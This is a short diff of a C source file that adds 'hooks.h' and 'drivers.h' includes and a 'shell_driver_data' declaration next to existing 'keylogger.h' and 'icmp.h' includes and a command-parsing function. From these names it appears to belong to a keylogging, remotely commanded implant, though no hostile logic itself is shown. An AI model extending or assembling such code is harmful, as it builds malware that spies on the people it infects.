@@ -9,7 +9,10 @@
 #include "args.h"
 #include "icmp.h"
 #include "keylogger.h"
+#include "hooks.h"
+#include "drivers.h"
 
+extern struct shell_driver_data driver_data;
 
 // parses the command, deletes the command string from data and returns the respective command
 command_t parse_command(char* data);
